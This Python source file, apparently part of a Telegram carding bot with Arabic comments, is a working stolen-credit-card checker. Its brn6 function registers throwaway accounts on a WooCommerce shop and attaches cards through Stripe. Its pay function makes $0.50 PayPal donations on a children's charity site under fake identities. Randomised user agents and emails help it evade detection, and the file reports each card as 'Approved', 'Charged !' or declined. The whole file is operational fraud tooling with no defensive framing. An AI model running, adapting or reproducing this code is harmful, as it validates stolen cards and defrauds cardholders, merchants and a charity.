# ==================== gatet.py (نسخة PayPal/Braintree مع الديناميكيات فقط) ====================

import os, sys
import random
import telebot
import requests, random, time, string, base64
from bs4 import BeautifulSoup
import os, json
import base64
from telebot import types
import time, requests
from re import findall
import re
import json
import threading
import uuid
import socks
import socket
from stem import Signal
from stem.control import Controller
from faker import Faker
import cloudscraper
import subprocess
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================ إعدادات الديناميكية ================
def get_random_user_agent():
    """تجيب User-Agent عشوائي من المكتبة"""
    return generate_user_agent()

def get_random_ip():
    """تولد IP عشوائي (للهيدر بس، مش تغيير حقيقي للـ IP)"""
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def generate_random_email(domain=None):
    """تولد إيميل عشوائي مع دومينات متعددة"""
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com', 'aol.com', 'protonmail.com']
    if not domain:
        domain = random.choice(domains)
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
    number = random.randint(10, 9999)
    return f"{name}{number}@{domain}"

def generate_random_name():
    """تولد اسم عشوائي"""
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis']
    return random.choice(first_names), random.choice(last_names)

def generate_random_postal():
    """تولد رمز بريدي عشوائي (UK)"""
    postal_codes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ',
                    'YO18SU', 'CA56NA', 'PL28EQ', 'PR253NE', 'NE304QB']
    return random.choice(postal_codes)

def generate_random_phone():
    """تولد رقم تليفون عشوائي UK"""
    prefixes = ['077', '078', '079', '074', '075', '076']
    return f"{random.choice(prefixes)}{random.randint(1000000, 9999999)}"

# ================ الدوال الأساسية (زي ما هي من غير تعديل) ================

def brn6(ccx):
    import requests
    ccx = ccx.strip()
    c = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    
    # ✅ User-Agent ديناميكي
    user = get_random_user_agent()
    
    r = requests.session()
    r = requests.session()
    user = get_random_user_agent()
    
    x = random.randrange(0, 9999)
    s = random.randrange(10, 1000)
    
    r = requests.Session()
    user = get_random_user_agent()
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'if-modified-since': 'Sat, 29 Nov 2025 07:18:13 GMT',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://calefs.com/', headers=headers)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://calefs.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://calefs.com/my-account/', cookies=r.cookies, headers=headers)
    
    nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    
    # ✅ إيميل ديناميكي
    dynamic_email = generate_random_email()
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://calefs.com',
        'referer': 'https://calefs.com/my-account/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    data = {
        'email': f'y7is61{x}{c}@{random.choice(["gmail.com", "yahoo.com", "hotmail.com"])}',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://calefs.com/',
        'wc_order_attribution_session_pages': '4',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user,
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    
    response = r.post('https://calefs.com/my-account/', cookies=r.cookies, headers=headers, data=data)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'referer': 'https://calefs.com/my-account/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user
    }
    
    response = r.get('https://calefs.com/my-account/payment-methods/', cookies=r.cookies, headers=headers)
    
    headers = {
        'authority': 'calefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://calefs.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://calefs.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
    pay = response.text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
    key = re.search(r'"key"\s*:\s*"([^"]+)"', response.text).group(1)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    
    data = f'type=card&card[number]={c}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fcalefs.com&time_on_page=640401&client_attribution_metadata[client_session_id]=e7c66f90-b4b0-4242-b28f-fdc418629619&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=45b21a2d-170e-441d-9951-194b48db0483&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=b87cbedb-8133-4c9a-a9f0-ac40aa3cd473ba8248&muid=01da6d45-6393-4e48-bdb9-0965513ab1a9ca4263&sid=7abe9c75-b031-46df-8775-6bc7d059e678d0cfc1&key={key}&_stripe_version=2024-06-20'
    
    response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    id = response.json()['id']
    
    headers = {
        'authority': 'calefs.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://calefs.com',
        'referer': 'https://calefs.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': pay,
    }
    
    response = r.post('https://calefs.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    if '"success":true,"data":{"status":"succeeded"' in response.text:
        return 'Approved'
    else:
        return 'declined'


# ==================== إعدادات الموقع الجديد (Oking Foundation) ====================
SITE_URL = 'https://beingkid.org/donations/sponsorship-opportunities-for-classes-events/'
URL_AJAX = 'https://beingkid.org/wp-admin/admin-ajax.php'

def extract_data():
    s = requests.Session()
    s.verify = False
    ua = get_random_user_agent()
    headers = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    r = s.get(SITE_URL, headers=headers, timeout=30)
    html = r.text
    
    fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
    fi = re.search(r'name="give-form-id" value="(.*?)"', html)
    nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
    
    if not all([fp, fi, nc]):
        return None
        
    enc = re.search(r'"data-client-token":"(.*?)"', html)
    if not enc:
        return None
        
    dec = base64.b64decode(enc.group(1)).decode('utf-8')
    au = re.search(r'"accessToken":"(.*?)"', dec)
    
    if not au:
        return None
        
    return {
        'fp': fp.group(1), 
        'fi': fi.group(1), 
        'nc': nc.group(1),
        'at': au.group(1), 
        'session': s
    }

def generate_fake_data():
    first, last = generate_random_name()
    email = generate_random_email()
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": email, "card_name": f"{first} {last}"}

def pay(ccx):
    ccx = ccx.strip()
    parts = ccx.split('|')
    if len(parts) < 4: 
        return 'INVALID_FORMAT'
    
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: 
        yy = '20' + yy
    
    fake = generate_fake_data()
    d = extract_data()
    
    if not d: 
        return 'EXTRACT_FAILED | Could not get form data from site'
    
    s = d['session']
    fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']
    
    ua = get_random_user_agent()
    
    headers = {
        'origin': SITE_URL, 
        'referer': SITE_URL,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua, 
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'give-honeypot': '', 
        'give-form-id-prefix': fp, 
        'give-form-id': fi,
        'give-form-title': '', 
        'give-current-url': SITE_URL,
        'give-form-url': SITE_URL, 
        'give-form-minimum': '0.50',
        'give-form-maximum': '999999.99', 
        'give-form-hash': nc,
        'give-price-id': '3', 
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1', 
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': '0.50',
        'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce', 
        'give_first': fake['first_name'],
        'give_last': fake['last_name'], 
        'give_email': fake['email'],
        'card_name': fake['card_name'], 
        'card_exp_month': '', 
        'card_exp_year': '',
        'give_action': 'purchase', 
        'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation', 
        'give_ajax': 'true',
    }
    
    s.post(URL_AJAX, headers=headers, data=data, timeout=30)
    
    mp = MultipartEncoder(fields={
        'give-honeypot': (None, ''), 
        'give-form-id-prefix': (None, fp),
        'give-form-id': (None, fi), 
        'give-form-title': (None, ''),
        'give-current-url': (None, SITE_URL), 
        'give-form-url': (None, SITE_URL),
        'give-form-minimum': (None, '0.50'), 
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nc), 
        'give-price-id': (None, '3'),
        'give-recurring-logged-in-only': (None, ''), 
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, '0.50'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'), 
        'give_first': (None, fake['first_name']),
        'give_last': (None, fake['last_name']), 
        'give_email': (None, fake['email']),
        'card_name': (None, fake['card_name']), 
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''), 
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers['content-type'] = mp.content_type
    
    r1 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_create_order', headers=headers, data=mp, timeout=30)
    try:
        tok = r1.json()['data']['id']
    except:
        return f'ORDER_ERROR: {r1.text[:150]}'
    
    pp_headers = {
        'authority': 'cors.api.paypal.com', 
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
        'authorization': f'Bearer {at}',
        'braintree-sdk-version': '3.32.0-payments-sdk-dev',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1', 
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site', 
        'user-agent': ua,
    }
    
    json_data = {
        'payment_source': {
            'card': {
                'number': cc, 
                'expiry': f'{yy}-{mm}', 
                'security_code': cvv,
                'attributes': {
                    'verification': {
                        'method': 'SCA_WHEN_REQUIRED'
                    }
                }
            }
        },
        'application_context': {
            'vault': False
        },
    }
    
    s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', 
           headers=pp_headers, json=json_data, timeout=30)
    
    mp2 = MultipartEncoder(fields={
        'give-honeypot': (None, ''), 
        'give-form-id-prefix': (None, fp),
        'give-form-id': (None, fi), 
        'give-form-title': (None, ''),
        'give-current-url': (None, SITE_URL), 
        'give-form-url': (None, SITE_URL),
        'give-form-minimum': (None, '0.50'), 
        'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nc), 
        'give-price-id': (None, '3'),
        'give-recurring-logged-in-only': (None, ''), 
        'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, '0.50'),
        'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'), 
        'give_first': (None, fake['first_name']),
        'give_last': (None, fake['last_name']), 
        'give_email': (None, fake['email']),
        'card_name': (None, fake['card_name']), 
        'card_exp_month': (None, ''),
        'card_exp_year': (None, ''), 
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers['content-type'] = mp2.content_type
    
    r2 = s.post(f'{URL_AJAX}?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=30)
    txt = r2.text
    
    # الردود زي ما هي من غير تعديل
    if 'DO_NOT_HONOR' in txt: 
        return 'Declined | Do not honor'
    elif 'ACCOUNT_CLOSED' in txt: 
        return 'Declined | Account closed'
    elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in txt: 
        return 'Declined | Account closed'
    elif 'LOST_OR_STOLEN' in txt: 
        return 'Declined | LOST OR STOLEN'
    elif 'CVV2_FAILURE' in txt: 
        return 'Declined | Card Issuer Declined CVV'
    elif 'SUSPECTED_FRAUD' in txt: 
        return 'Declined | SUSPECTED FRAUD'
    elif 'INVALID_ACCOUNT' in txt: 
        return 'Declined | INVALID_ACCOUNT'
    elif 'REATTEMPT_NOT_PERMITTED' in txt: 
        return 'Declined | REATTEMPT NOT PERMITTED'
    elif 'ACCOUNT BLOCKED BY ISSUER' in txt: 
        return 'Declined | ACCOUNT_BLOCKED_BY_ISSUER'
    elif 'ORDER_NOT_APPROVED' in txt: 
        return 'Declined | ORDER_NOT_APPROVED'
    elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in txt: 
        return 'Declined | PICKUP_CARD_SPECIAL_CONDITIONS'
    elif 'PAYER_CANNOT_PAY' in txt: 
        return 'Declined | PAYER CANNOT PAY'
    elif 'INSUFFICIENT_FUNDS' in txt: 
        return 'Declined | Insufficient Funds'
    elif 'GENERIC_DECLINE' in txt: 
        return 'Declined | GENERIC_DECLINE'
    elif 'COMPLIANCE_VIOLATION' in txt: 
        return 'Declined | COMPLIANCE VIOLATION'
    elif 'TRANSACTION_NOT PERMITTED' in txt: 
        return 'Declined | TRANSACTION NOT PERMITTED'
    elif 'PAYMENT_DENIED' in txt: 
        return 'Declined | PAYMENT_DENIED'
    elif 'INVALID_TRANSACTION' in txt: 
        return 'Declined | INVALID TRANSACTION'
    elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in txt: 
        return 'Declined | RESTRICTED OR INACTIVE ACCOUNT'
    elif 'SECURITY_VIOLATION' in txt: 
        return 'Declined | SECURITY_VIOLATION'
    elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in txt: 
        return 'Declined | DECLINED DUE TO UPDATED ACCOUNT'
    elif 'INVALID_OR_RESTRICTED_CARD' in txt: 
        return 'Declined | INVALID CARD'
    elif 'EXPIRED_CARD' in txt: 
        return 'Declined | EXPIRED CARD'
    elif 'CRYPTOGRAPHIC_FAILURE' in txt: 
        return 'Declined | CRYPTOGRAPHIC FAILURE'
    elif 'TRANSACTION_CANNOT_BE_COMPLETED' in txt: 
        return 'Declined | TRANSACTION CANNOT BE COMPLETED'
    elif 'DECLINED_PLEASE_RETRY' in txt: 
        return 'Declined | DECLINED PLEASE RETRY LATER'
    elif 'TX_ATTEMPTS_EXCEED_LIMIT' in txt: 
        return 'Declined | EXCEED LIMIT'
    elif 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
        return 'Charged !'
    else:
        try:
            return f"Response | {json.loads(txt)['data']['error']}"
        except:
            return f'Response | {txt[:300]}'
